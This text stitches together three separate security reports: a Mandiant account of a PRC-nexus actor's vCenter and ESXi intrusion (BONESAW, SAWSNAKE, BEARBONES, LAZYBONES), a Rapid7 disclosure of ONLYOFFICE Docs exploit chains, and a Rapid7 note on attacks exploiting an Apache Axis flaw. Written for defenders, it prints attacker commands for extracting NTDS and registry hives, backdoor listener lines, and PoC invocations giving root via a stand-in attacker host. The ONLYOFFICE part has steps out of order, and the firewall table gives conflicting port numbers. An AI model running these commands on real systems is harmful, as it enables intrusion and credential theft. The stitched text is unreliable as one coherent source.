passwords. Mandiant has evidence that ARMORY CASTLE had knowledge of CVE-2026-123890 prior to the disclosure of CVE-2026-59309 on July 29, 2026. Logs indicate that BONESAW was executed in early September 2026 against a vCenter server already patched against CVE-2026-59309, and the recovered Go binary contains a build timestamp of 2026-07-13T09:21:24Z (16 days before CVE-2026-59309 was disclosed), although Go build metadata can be modified prior to compilation. ARMORY CASTLE named BONESAW vcenter-db-teamcheck-go and compiled it in a Windows development environment based on Golang build artifacts: E:/CodeFiles/VulnScan/Vcenter/go_teamcheck/ . BONESAW supports multiple command-line arguments, with primary functionality centered on the csa subcommand to remotely create an SSO admin account. Subcommand csa ("Create SSO admin with minimal parameters"): • Loads embedded default configuration template and parses CLI flags: • -h: Target vCenter address or vim25 SOAP endpoint (required). • -u: Username for the new SSO admin account (required). • -p: Password for the new SSO admin account (required). • -lu: Existing vCenter local admin UPN used for the vmdird bridge authentication (default: administrator@vsphere[.]local). • -d: Tenant/domain name for the created SSO account (default: vsphere[.]local). • -mdb-path: Path to an existing data.mdb file to skip remote database download. • -check-version: Probe target version and connectivity before executing the exploit chain. • -auto-d: Auto-discover SSO tenant/domain before running (overrides -d if discovery succeeds). Figure 8: BONESAW Command Line Arguments When executed utilizing the CSA command line flag, BONESAW creates the following files on disk: /temp/extracted_tenant_signer_/anon__data.mdb (Exfiltrated copy of /storage/db/vmware-vmdir/data.mdb) /temp/extracted_tenant_signer_/-tenantcredential-.key.pem (Extracted RSA private key in PEM format) /temp/extracted_tenant_signer_/-tenantcredential-.key.der (Extracted RSA private key in DER format) /temp/extracted_tenant_signer_/-tenantcredential-.leaf.pem (Extracted leaf X.509 signing certificate) /temp/extracted_tenant_signer_/-tenantcredential-.chain.pem (Extracted X.509 certificate chain) /temp/extracted_tenant_signer_/-tenantcredential-.context.json (Target SSO and signer metadata) Figure 9: BONESAW Filesystem Artifacts Shortly after the successful execution of BONESAW, ARMORY CASTLE staged and deployed an additional utility /tmp/sss tracked as SAWSNAKE to the Linux appliance. SAWSNAKE is a Golang utility that enables vCenter SAML authentication bypass and session cookie generation, ultimately enabling ARMORY CASTLE to conduct Golden SAML attacks against vCenter following the successful execution of BONESAW. This allows the threat actor to forge authentication tokens, bypass MFA, and impersonate any user. The core functionality of SAWSNAKE is a custom Go-based port of the Python-based vCenter SAML Login Tool from vcenter_saml_login.py . SAWSNAKE provides the ability to extract Identity Provider (IdP) signing keys and trusted certificates from a vCenter data.mdb database, export extracted credentials to PEM files on disk, forge and sign SAML 2.0 assertions for the Administrator account, and authenticate to a target vCenter server to obtain administrative session cookies. SAWSNAKE parses command-line arguments to determine its operating mode and supports the following command line arguments: -h, --help - show this help message and exit -p, --path PATH - Path to the data.mdb file (extract mode) -t, --target TARGET - The IP address of the target vCenter -k, --key KEY - IdP private key PEM file (direct-cert mode) -c, --cert CERTS - Trusted certificate PEM file. May be repeated; each file may contain one or more CERTIFICATE blocks. --domain DOMAIN - SSO domain (default: parse from certificate subject DC=) --hostname HOSTNAME - vCenter FQDN (default: read from vCenter SSL certificate) -e, --export-dir EXPORT_DIR - Parse data.mdb with --path and write the PEM files needed for the direct-cert mode to this directory, then exit. -v, --verbose - Print extracted/loaded certificates Figure 10: SAWSNAKE Command Line Arguments SAWSNAKE creates the following files on disk: /idp_key.pem /trusted_cert_2.pem /domain.txt Figure 11: Files created by SAWSNAKE Mandiant identified a second sample of SAWSNAKE that is likely an updated version. This sample added verbose debug logging to standard output across TLS, HTTP, SAML initiation, XML signing, and login routines, along with expanded redirect handling for up to 10 HTTP 302 redirects to support multi-hop authentication. Consistent with earlier activity, ARMORY CASTLE deleted SAWSNAKE and its output files from disk using rm . Shortly after the deployment of SAWSNAKE, ARMORY CASTLE leveraged an additional backdoor /tmp/dbr tracked as BEARBONES. BEARBONES is written in C and is based on the open-source Dropbear SSH Server. It is capable of bypassing system password authentication when using password-based authentication, logging plaintext credentials, and loading or generating server host keys from /tmp instead of the default directory /etc/dropbear . The authentication handler svr_auth_password for the packet type SSH_MSG_USERAUTH_REQUEST was backdoored to bypass /etc/shadow validation and grant access if the SHA-256 digest of the first 14 bytes of client password matches a hardcoded SHA-256 hash, while also logging plaintext credentials. Additionally, the internal version string and the session identification string were modified to “ 23345 ” and “ SSH-2.0-pulsesecure_23345 ”. Pivoting on this SSH banner identified a suspected obfuscation network of compromised third-party firewalls and routers exposing SSH-2.0-pulsesecure_23345 on non-standard high TCP ports. ARMORY CASTLE executed BEARBONES several times from the Linux appliance, first attempting to open a listener on TCP port 53 and later on TCP port 33992. /tmp/dbr -R -p 53 /tmp/dbr -R -p 33992 Figure 12: BEARBONES Command Line Execution After the execution of BEARBONES to create a listener on TCP port 33992, ARMORY CASTLE moved laterally to the vCenter appliance as the Administrator and created a local administrator account named sps-@vsphere.local . Notably, ARMORY CASTLE enabled SSH on vCenter via the vCenter Server Appliance Management Interface (VAMI) API through a PUT request to /rest/appliance/access/ssh . Mandiant also observed this TTP during BRICKSTORM intrusions conducted by suspected PRC-nexus actor UNC6201. After enabling SSH, ARMORY CASTLE connected to the vCenter via SSH using the newly created local administrator account. ARMORY CASTLE then conducted credential theft, targeting the vCenter internal master crypto key file as well as the PostgreSQL password file using SSH. ARMORY CASTLE disabled the SSH service via the VAMI API immediately after extracting the vCenter master symmetric key and PostgreSQL database credentials. ARMORY CASTLE then was observed authenticating to ESXi Host Client (“ESXUI”) using the vpxuser account and also connected to it via SSH using the root account. Complete Mission ARMORY CASTLE used the WinSCP client to enumerate the ESXi file system, attached disks, mounted Virtual Machine File System (VMFS) volumes, and added an SSH public key to the root account’s authorized keys. ARMORY CASTLE conducted further reconnaissance and data theft on the ESXi filesystem using the root account. The actor was primarily observed enumerating directories and VMFS volumes. To stage and exfiltrate data from the ESXi filesystem, ARMORY CASTLE created a hidden directory, .a, on a VMFS volume to which they established an SCP connection to the ESXi using scp -r -d -t "/vmfs/volumes//.a ". ARMORY CASTLE then staged and extracted a suspected VMware specific toolset onto the ESXi host using tar xzf vmfs-pydist.tar.gz . python vmfs_browser.py -d "/dev/disks/vml.:1" ls . python vmfs_browser.py -d "/dev/disks/vml.:1" info "-flat.vmdk" python vmfs_browser.py -d "/dev/disks/vml.:1" ls "-flat.vmdk:part2" python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/NTDS" ./NTDS python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SYSTEM" ./SYSTEM python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/config/SECURITY" ./ python vmfs_browser.py -d "/dev/disks/vml.:1" extract "-flat.vmdk:part4/Windows/System32/dns" ./ Figure 13: ARMORY CASTLE reconnaissance of guest VMs ARMORY CASTLE then archived the extracted files into o.tar.gz , copied the archive from the ESXi filesystem using scp -r -p -d -f "o.tar.gz" , and deleted the hidden .a directory. On the Linux appliance, ARMORY CASTLE staged the corresponding OpenSSH RSA private key at /tmp/123.key (matching the public key added to ESXi root authorized_keys ) to authenticate outbound from the Linux appliance to ESXi over SSH without a password, alongside the BEARBONES SSH listener on the Linux appliance. From the Linux appliance, staged archives were downloaded via HTTP GET requests to the Remote Support appliance, from which ARMORY CASTLE likely exfiltrated the data. /usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -i /tmp/123.key -o BatchM [TRUNCATED@128] Figure 14: ARMORY CASTLE SSH Tunnel ARMORY CASTLE deployed a Slack-based backdoor tracked as LAZYBONES ( /usr/bin/vmtoolscs) to an additional Linux appliance alongside the /tmp/123.key SSH private key. ARMORY CASTLE established persistence using a systemd service file set to restart every 50 minutes. LAZYBONES is a lightweight backdoor, written in Go, that establishes command-and-control (C2) communication over HTTPS using Slack. This malware periodically checks the most recent message in a designated Slack channel for commands. LAZYBONES supports core backdoor functionalities, including command execution and file transfer. Specifically, this variant encrypts Slack C2 messages with AES-256-CTR prior to Base64 encoding, polls with a 150 to 450 second jitter interval, and supports four commands ( cmd , upload , download , and sleep ) for command execution, file transfer, and beacon interval adjustment. Mandiant observed ARMORY CASTLE deploying LAZYBONES in a separate campaign in early 2025 following the successful exploitation of CVE-2025-22457. Attribution GTIG attributes this activity to the suspected PRC-nexus espionage actor ARMORY CASTLE (formerly tracked as UNC5221). As noted in our prior blog , the tooling and TTPs leveraged within this campaign align with previously observed activity from ARMORY CASTLE, and in the case of LAZYBONES, directly overlap with previously observed activity. Outlook and Implications While GTIG and Mandiant have tracked ARMORY CASTLE exploiting zero-days and n-days in edge and security appliances for initial access since 2023, BONESAW represents a significant expansion into post-compromise use of zero-days. The group's use of VMware-specific tools like SAWSNAKE and vmfs_browser.py , alongside malware designed to operate on Remote Support and Linux systems, represent a diverse toolset including capabilities specifically tailored to target several different appliances, demonstrating the threat actor's deep understanding of each. The use of three separate specialized sets of malware and two zero-days in the course of a single compromise indicates that there are significant resources supporting ARMORY CASTLE operations. It also shows the extent of the threat actor’s operational commitment to compromise high priority targets. Lastly, it is important to highlight that the build time of BONESAW predates its deployment in this intrusion by over a month, indicating it was likely developed for broader operations. Remediation and Hardening The exploitation of CVE -2026-123890 by ARMORY CASTLE underscores a reality: virtualization infrastructure such as VMware vCenter remains a prime target for advanced persistent threats (APTs). Because vCenter serves as the centralized control plane for the virtualized data center, relying solely on reactive patching is insufficient to protect it. Organizations must adopt a proactive, Zero Trust approach to infrastructure hardening to defend against current and undiscovered zero-day vulnerabilities. For a comprehensive framework on securing virtualization platforms against advanced persistent threats, organizations are highly advised to consult the Mandiant guide vSphere and BRICKSTORM Malware: A Defender's Guide . This guide details an infrastructure-centric defense strategy, encompassing STIG benchmarking, identity management via Privileged Access Workstations (PAWs), and transforming the vCenter appliance into a proactive security sensor. To secure vulnerable systems, it is highly recommended that affected organizations promptly deploy the official Broadcom patch . The Risks of Default Configurations: The VCSA Host-Based Firewall A common misconception in defending the vCenter control plane is that the native VCSA host-based firewall managed via the Virtual Appliance Management Interface (VAMI) provides adequate protection against lateral movement. In practice, relying on this default GUI-based firewall introduces severe operational and security limitations that threat actors like ARMORY CASTLE exploit: Lack of Port-Specific Granularity: The native VAMI GUI lacks the precision required for a Zero Trust model. To grant an internal server (such as a backup server) legitimate access to the vSphere API on TCP 443, an administrator is often forced to trust that IP for all ports. If that internal server is compromised, the attacker inherits an unobstructed path to highly sensitive management interfaces like SSH (22) and the VAMI (5480). Circular Administrative Dependency: The VCSA firewall is managed via the VAMI, which resides on TCP port 5480. If an attacker gains VAMI access as ARMORY CASTLE demonstrated to enable SSH, they can use their compromised role to deactivate the firewall entirely. Forensic Visibility Gaps: The VAMI firewall is designed for connectivity management, not security monitoring, and does not generate remote logs for denied connection attempts or shell activity. This blinds the SOC to active lateral movement and port scanning. Inbound-Only Policy: The default GUI focuses exclusively on inbound traffic, leaving outbound (egress) policy unmanaged. This allows malware on a compromised VCSA to communicate freely with external command-and-control (C2) infrastructure. Proactive Hardening with the VCSA Hardening Tool To secure the vCenter control plane against advanced campaigns and future zero-days, Mandiant recommends utilizing the VCSA Hardening & Logging Tool . This script bypasses the vulnerable VAMI GUI and enforces security configurations directly at the Photon Linux kernel level via iptables. By transitioning the appliance to a strict "Default Deny" posture, enforcing granular egress filtering, and bridging kernel-level events to a remote SIEM, the tool transforms the VCSA from a passive appliance into an active security sensor. The table below illustrates how deploying this proactive hardening script would have disrupted ARMORY CASTLE's attack chain at multiple stages, demonstrating its efficacy against zero-day exploits. VCSA Hardening Feature Impact on the ARMORY CASTLE Attack Chain Protection Against Future Zero-Days VCSA iptables Inbound DROP Policy & Connection Logging (Management Ports) The nmap scans targeting TCP ports 443, 5480, and 22 are silently dropped because the attacker's source IP is not in the trusted whitelists. These blocked connection attempts are instantly forwarded to the SIEM via the iptables-log-bridge.sh service, exposing the active network reconnaissance. Conceals critical management interfaces from internal network mapping tools and provides high-fidelity, early-warning alerts of active lateral movement before exploitation can occur. VCSA iptables Inbound DROP Policy (TCP 443) Even if BONESAW extracts the SAML key over port 2012, the attacker cannot utilize the SAWSNAKE-forged administrative cookies. The firewall drops all connections to the vSphere Web Client/API (TCP 443) from the compromised Linux appliance because it is not in the TRUSTED_WEB_IPS array. Provides defense-in-depth: Even if a zero-day allows credential theft or authentication bypass on a backend service, the stolen credentials/tokens cannot be used to access the management plane from an untrusted network. VCSA iptables Inbound DROP Policy (TCP 2010) An iptables DROP policy on TCP 2012 for non-allowlisted IPs prevents the exploit payload originating from a compromised Linux appliance from reaching the vmdird service. Drops unauthorized inbound connections to management interfaces and RPC services, mitigating network-level exploitation of vulnerable services. VCSA iptables Inbound DROP Policy (TCP 22 & 5480) Blocks the OS-level pivot. The firewall drops the PUT request to the VAMI API (TCP 5480 or 443) used to enable the SSH daemon. Furthermore, even if SSH was already enabled, the VCSA_SSH_RULES chain drops all SSH connections Protects the underlying OS and databases from direct credential theft or tampering. Even if an attacker gains administrative privileges within the web application, they are blocked from dropping down to a root shell. VCSA iptables Egress DROP Policy An egress DROP policy prevents SCP data exfiltration and blocks the LAZYBONES backdoor from establishing HTTPS C2 communications with external Slack endpoints. Blocks unauthorized outbound internet and internal network connections, preventing the VCSA from acting as a pivot point or establishing external C2. VCSA OS-Level Command and Syslog Auditing Remote syslog forwarding captures the execution of tar and Python vmfs_browser.py over SSH, exposing the extraction of NTDS.dit and registry hives in real-time. Forwards bash command execution and dropped network packets to a SIEM, bypassing local anti-forensics (e.g., .bash_history deletion) and alerting on unauthorized shell activity. VCSA Kernel-Level Rule Enforcement iptables rules operate independently of the VAMI application, preventing the actor from using the VAMI API (/rest/appliance/access/ssh) to circumvent network security controls. Decouples network security from the vCenter application layer, ensuring firewall policies cannot be modified via compromised VAMI or vSphere administrative credentials. persistent_hot.summary: Overview As part of our research into Zimbra Collaboration Suite , Rapid7 reported five findings in ONLYOFFICE Docs. An attacker with view-only access to a document can chain vulnerabilities in ONLYOFFICE Docs to execute arbitrary operating system commands as root inside the official DocumentServer container. The findings also expose server files and document data that the viewer never displays, even when downloading is disabled. CVE Finding CVSS CVE-2026-113627 DocBuilder native file read and Session JWT forgery 7.1 High CVE-2026-110385 DocBuilder SaveFile conversion parameter injection and code execution 8.7 High CVE-2026-97727 Complete-save format path traversal and arbitrary file write 6.5 Medium CVE-2026-113630 Root-helper command injection 7.8 High CVE-2026-113631 View-only export of non-rendered document data 6.5 Medium ONLYOFFICE confirmed on October 23, 2026 that all five findings were fixed in Document Server 10.0. The changelog describes the release's security changes. Proof-of-concept code is available on the accompanying Github repository . Product description ONLYOFFICE Docs provides online viewers and editors for documents, spreadsheets, presentations, forms and PDFs. It supports collaborative editing and can integrate with applications that store and share files. An integrating application, for example Zimbra Collaboration Suite, supplies an opening configuration identifying the document and the user's permissions, signed with the Browser key. This client-visible credential is referred to below as the Editor JWT. After opening a document, DocumentServer issues a Session JWT for reconnecting and saving. Incoming service requests, including document-building jobs, are validated using ONLYOFFICE's Inbox JWT key. DocumentServer can also send generated document output to the integrating application's callback URL. Credit This assessment and the exploit-chain research were conducted by Jonah Burgess (CryptoCat), Senior Security Researcher at Rapid7 . The findings are being disclosed in accordance with Rapid7's vulnerability disclosure policy . Testing setup Rapid7 tested the official onlyoffice/documentserver:9.4.0 image with package onlyoffice-documentserver 9.4.0-129 . DocumentServer ran as the ds account. JWT validation remained enabled, and no authentication check, private-address filter, or vendor code was disabled or modified. Browser and Inbox validation used the same effective signing key. Our analysis of the vendor supplied fixes compares the v9.4.0.129 and v10.0.0.169 tags of ONLYOFFICE/server , ONLYOFFICE/core and ONLYOFFICE/document-server-package . Rapid7 also performed targeted checks on package 10.0.0-169 . For the conditional WOPI test on 9.4.0-129 , Rapid7 enabled only WOPI_ENABLED=true and left the shipped WOPI IP filter unchanged at its default allow-all rule. Exploitation was demonstrated only on 9.4.0-129; the broader affected-version range is unknown. Impact View-only document access can lead to command execution as ds and then root inside the official container. The two exploit chains use different file-write stages. With WOPI enabled and an attacker-controlled source reachable and permitted by its IP filter, the same DocBuilder authorization failure provides an unauthenticated entry. Separately, a viewer denied download can obtain a reconstructed DOCX containing custom XML, custom properties and field instructions that the viewer never displayed. Editor JWT authorizes native file reads and session JWT forgery (CVE-2026-113627) An attacker with view-only access to a document can use /docbuilder to steal files from the ONLYOFFICE server. In the tested build, this exposed the Session JWT signing key, allowing the attacker to forge credentials containing document keys and permissions that were never granted to the original viewer. Technical analysis Prerequisite: The attacker needs a valid Editor JWT for any document and access to /docbuilder . Target files must be readable by ds . The token-forgery step also requires the Session JWT signing key to be in a readable file, as it was in the tested build. No edit, download, print, review, or comment permission is required. The default-secret branch in getTenantSecret() contains: switch (type) { case commonDefines.c_oAscSecretType.Browser: case commonDefines.c_oAscSecretType.Inbox: res = utils.getSecretByElem(cfgSecretInbox); // [0] Shared signing key break; // ... other token types omitted ... } The branch at [0] selects the same configured signing key for Browser and Inbox tokens. builderRequest() passes the request to getRequestParams() : const authRes = yield docsCoServer.getRequestParams(ctx, req); // [1] Request JWT validation if (authRes.isDecoded) { cmd.setWithAuthorization(true); } At [1] , builderRequest() delegates JWT validation to getRequestParams() . That function's query-token branch checks the signature using the Inbox key: if (tenTokenEnableRequestInbox) { res.code = constants.VKEY; let checkJwtRes; if (res.params.token) { // [2] Inbox signature check checkJwtRes = yield checkJwt(ctx, res.params.token, commonDefines.c_oAscSecretType.Inbox); } else { checkJwtRes = yield checkJwtHeader(ctx, req); } // ... remaining validation and decoded-claim handling omitted ... } A view-only Editor JWT passes the signature check at [2] because Browser validation uses the same key. The check does not require the JWT to have been issued specifically for DocBuilder. /docbuilder treats the POST body as a DocBuilder script. After the JWT check above succeeds, that script can call GetFontBinary() with a supplied filename: std::wstring sFile = file->toStringW(); bool bIsFullFilePath = (std::wstring::npos != sFile.find('\\') || std::wstring::npos != sFile.find('/')); if (bIsFullFilePath) { bIsFullFilePath = NSFile::CFileBinary::Exists(sFile); // [3] Path existence check } // ... font-map fallback omitted ... return CJSContext::createUint8Array(sFile); // [4] Return file bytes GetFontBinary() accepts an existing absolute path at [3] and returns its bytes at [4] . Ssani4 previously reported this native file-read behavior in DocumentBuilder issue #147 on November 21, 2025. That report explicitly identified GetFontBinary() and ZipFileAsString() and used a Session JWT obtained from /downloadas to authorize /docbuilder . ONLYOFFICE closed the issue as fixed in DocumentBuilder 9.2.0 . Rapid7 reproduced GetFontBinary() file reads in 9.4.0-129 using a view-only Editor JWT, then demonstrated session-signing-key theft and token forgery. The native read itself was previously reported; the analysis here documents its continued exposure through that entry point and its role in the subsequent chains. Exploitation Reading a server file The attacker submits a DocBuilder script using a JWT issued for view-only access to any document. The attacker submits a WOPISrc ending in / and an empty access token to the public launch endpoint. The launch logic in wopiClient.js contacts that source for editable document metadata and signs a Browser JWT: const access_token = req.body['access_token'] || ''; // [0] Empty token default // WOPI metadata is requested from the attacker-controlled source. const secret = yield tenantManager.getTenantSecret(ctx, commonDefines.c_oAscSecretType.Browser); params.token = jwt.sign(params, utils.getJwtHsKey(secret), options); // [1] Sign Browser JWT With an empty access token at [0] , DocumentServer trusts the returned metadata and issues a signed Browser JWT at [1] . The token's document key comes from createDocId() , which takes the final URL segment: const fileId = wopiSrc.substring(wopiSrc.lastIndexOf('/') + 1); // [2] URL file identifier let docId = undefined; if ('view' !== mode) { docId = `${fileId}`; // [3] Editable document key } The trailing slash makes fileId at [2] empty, which becomes the signed document key at [3] . Because Browser and Inbox tokens use the same signing key, /docbuilder accepts this WOPI Browser JWT as authorization. The empty key also selects the new-job branch in builderRequest() : let docId = params.key; // ... request setup omitted ... const needCreateId = !docId; // [4] Empty-key job creation // ... request validation omitted ... if (needCreateId) { const task = yield* taskResult.addRandomKeyTask(ctx, undefined, 'bld_', 8); // [5] Allocate job key docId = task.key; // ... context setup omitted ... } // ... script body stored under the new job key ... if (needCreateId) { // ... queue-data setup omitted ... yield* docsCoServer.addTask(queueData, constants.QUEUE_PRIORITY_LOW); // [6] Queue DocBuilder script } The empty key enables job creation at [4] ; [5] allocates a fresh key and [6] queues the posted script for execution. This provides an unauthenticated entry into the DocBuilder findings. DocBuilder chain Authorization: The /docbuilder authorization failure documented in Editor JWT Authorizes Native File Reads and Session JWT Forgery accepts the view-only Editor JWT instead of requiring a DocBuilder-specific token. Code execution: DocBuilder Conversion Parameter Injection Enables Code Execution makes X2T extract an attacker appender, command script, and runtime configuration outside the job directory. DocService loads the appender as ds . Root execution: The appender invokes Passwordless Maintenance Command Elevates ds to Root , and the passwordless helper executes the supplied command as root . The DocBuilder PoC runs this chain with a view-only Editor JWT: python3 pocs/docbuilder_savefile_params_rce.py \ --documentserver https://docs.example.test \ --token-file /secure/view-only.jwt \ --root \ --command whoami \ --runtime-absent Output: root One malicious /docbuilder request triggers container-root execution. The PoC then makes additional /docbuilder requests to retrieve the command output. The direct SaveFile route also executed a command as root using a WOPI-issued Browser JWT, under the enablement, filter and reachability conditions above. File-read and traversal chain This path adds token forgery and a separate file-write stage: File read and token forgery: Editor JWT Authorizes Native File Reads and Session JWT Forgery uses the accepted editor or WOPI Browser JWT to read the session signing key and forge a save JWT. Code execution: Complete-Save Format Traversal Enables Arbitrary File Write uses that credential to install the appender, command script, and runtime configuration. DocService loads the appender as ds . Root execution: The appender invokes Passwordless Maintenance Command Elevates ds to Root , which executes the supplied command as root . The Editor-token PoC's --command mode installs the three execution files and invokes the root helper. It completed this chain from view-only access, returning uid=0(root) . The WOPI PoC performs this chain without a pre-existing JWT. It writes runtime.json last to trigger loading after the appender and command script are in place: python3 pocs/wopi_docbuilder_jwt_forgery.py \ --documentserver https://docs.example.test \ --public-wopi-src http://attacker.example.test:18084/document/ \ --command whoami \ --runtime-absent Output: root Under the WOPI conditions above, this chain requires no pre-existing DocumentServer account or token. Remediation Upgrade ONLYOFFICE Document Server to the latest supported release, version 10.0 or later. ONLYOFFICE confirmed that version 10.0 addresses all five findings. See the 10.0.0 security release notes and the vendor's Community Edition Docker update instructions . persistent_hot.summary: Overview On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436 , a critical unsafe reflection vulnerability ( CWE-470 ) in Axis 1.x that allows for unauthenticated remote code execution (RCE). Apache Axis is a Simple Object Access Protocol (SOAP) implementation used for the creation of Java Web services. CISA has assigned CVE-2026-90436 a CVSS score of 9.8 Critical . Since the initial November 6 disclosure, it has transpired that some versions of Atlassian Confluence Data Center and N-able N-central use the affected Axis library and are vulnerable to CVE-2026-90436. Both products require a non-default configuration in order to be vulnerable. CVE-2026-90436 is now being actively exploited in the wild against both known affected products. On November 13, 2026, Rapid7 MDR detected exploitation of CVE-2026-90436 against Atlassian Confluence Data Center in a customer environment. Separately, on November 13, 2026, N-able reported exploitation in the wild against N-central for a vulnerability that strongly correlates to CVE-2026-90436. A proof-of-concept exploit that leverages CVE-2026-90436 and targets N-central was published on November 12, 2026, as part of a series of public zero-day disclosures against N-central. On November 17, 2026, a Metasploit exploit module was released. The module exploits CVE-2026-90436 to achieve unauthenticated remote code execution against vulnerable Atlassian Confluence Data Center instances when “Remote API (XML-RPC & SOAP)” is enabled. On November 18, 2026, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-90436 to its Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation. Rapid7 recommends remediating exposed systems on an emergency basis outside of normal patching cycles. MDR observed exploitation On November 13, 2026, Rapid7's MDR team responded to a surge of alerts firing on the abnormal child processes launched by an Atlassian Confluence server. A review of the Confluence access logs revealed unauthenticated POST requests to /plugins/servlet/soap-axis1/confluenceservice-v2 , each returning an HTTP 500 (Internal Server Error). Despite the error responses, endpoint telemetry showed Confluence's Java process launching Bash and curl as the dedicated confluence service account, within seconds of these requests. The attacker proceeded to run hundreds of hex-encoded shell commands and scripts fetched from temporary Pinggy and Cloudflare Tunnel domains. Each command wrapped its output in labeled delimiters, and carried sequential task IDs, a structure that suggests the use of AI-assisted automated tooling. From this foothold, the attacker enumerated the host, network, Confluence configuration, encryption keys, and database settings. Just over three minutes after the first observed execution, the attackers were authenticating to MySQL with Confluence's own database credentials, querying page bodies, application links, and attachments with names associated with credentials, tokens, VPN configurations, and private keys. The attacker's scripts, likely AI-generated, then targeted files in Confluence's default location for uploaded page attachments ( /var/atlassian/application-data/confluence/attachments/v4/ ), parsed Office documents, searched for credentials, and hunted for payment card numbers, using Luhn checks to filter out false positives. The attacker continued extensive enumeration, mapping various internal services. They used a Confluence application credential to query the internal Atlassian Crowd API for users and group memberships, then ran Impacket's GetNPUsers.py against a domain controller, attempting an AS-REP roasting attack. Although these attempts failed, the access we did observe relied on credentials stored in Confluence, and roughly four hours after the first exploit request, the attacker had acquired a service account credential and began querying a production cloud data warehouse. Approximately twelve hours after the first exploit request, the attacker signed in to Microsoft 365 as an integration service account using legacy authentication from 192.238.253[.]176 . The same address appeared in the hostname of the Pinggy tunnel and in exploit requests observed earlier in the intrusion. Mitigation guidance Prioritize internet-accessible instances with the relevant APIs enabled, and check internal deployments as well. Apply the product-specific actions below, then investigate systems that were exposed for evidence of compromise. Axis 1.x through 1.4 is affected but has reached end of life (EOL) and Apache does not plan to publish a fixed Axis 1.x release. Apache recommends moving to another SOAP engine (for example, Apache Axis 2) or using an Axis 1.x build with this patch applied. Organizations using products that are affected by this issue should follow the product vendor's specific remediation instructions. Atlassian Confluence Data Center Atlassian lists versions 1.x through to 9.x as affected when “Remote API (XML-RPC & SOAP)” is enabled. Version 9.2.28 is the fixed release. The setting has been off by default for new installations since version 3.0. Confluence version 10.x and later removed the feature so are not vulnerable, and Atlassian Cloud is unaffected. Affected users should upgrade to version 9.2.28 or a current unaffected 10.x release. If patching must wait, an administrator can open “General Configuration” and “Further Configuration”, edit the settings, clear “Remote API (XML-RPC & SOAP)”, and save. The change takes effect without restarting Confluence, but integrations using the API may stop working. Follow the Confluence advisory for the latest fixes and mitigation instructions. N-able N-central On-premises administrators should confirm that “Legacy API” is disabled, even on 2026.4 HF2. N-able states that it is off by default, and provides instructions for disabling Legacy API . Its November 13 guidance says hosted environments received temporary protections directly; customers in both hosting models must still follow the vendor's Agent and Probe upgrade guidance. N-able also temporarily disabled the Intune integration as a precaution. Refer to the N-able security update for these responsibilities. Update: On November 16, 2026, N-able released N-central 2026.4 HF3 ( 2026.4.1.39 ) which addresses multiple issues including seventeen new CVEs. The “Legacy API” feature which exposed the vulnerable CVE-2026-90436 Axis attack surface has been disabled in this new release. N-central users should upgrade to N-central 2026.4 HF3 on an emergency basis outside of normal patching cycles. Follow the N-able advisory for the latest fixes and mitigation instructions. IOCs The presence of these IOCs in logs should prompt investigation, but the absence of these addresses does not confirm that an environment was unaffected.
